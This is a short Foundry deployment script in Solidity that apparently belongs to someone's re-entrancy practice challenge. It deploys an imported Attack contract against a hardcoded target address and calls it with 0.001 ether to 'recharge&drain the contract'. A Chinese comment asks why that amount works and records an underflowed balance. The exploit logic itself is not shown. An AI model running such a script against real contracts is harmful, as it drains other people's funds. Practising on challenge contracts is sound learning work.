// filepath: script/DeployAttack.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/re_entrancy.sol";
import "forge-std/console.sol";


contract Deploy is Script {
    function run() external {
        vm.startBroadcast();
        new Attack(0xd3D7E5E5Cd15f62f4918f65A327ee52395Cd243a);
        vm.stopBroadcast();
    }
}

contract CallFunction is Script {
    function run() external {
        vm.startBroadcast();
        Attack attackcontract = Attack(payable(address(0x24A8EFBbb1AC91DF2cd2135B5D5Eb2Ce8aD73EB6)));
        //call the withdraw function to recharge&drain the contract
        attackcontract.attack{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}

//踩坑1.为什么0.001 ether可以成功调用withdraw函数？但是0.11ether不行？
//(await contract.balanceOf("0x24A8EFBbb1AC91DF2cd2135B5D5Eb2Ce8aD73EB6")).toString()='115792089237316195423570985008687907853269984665640564039457572007913129639936'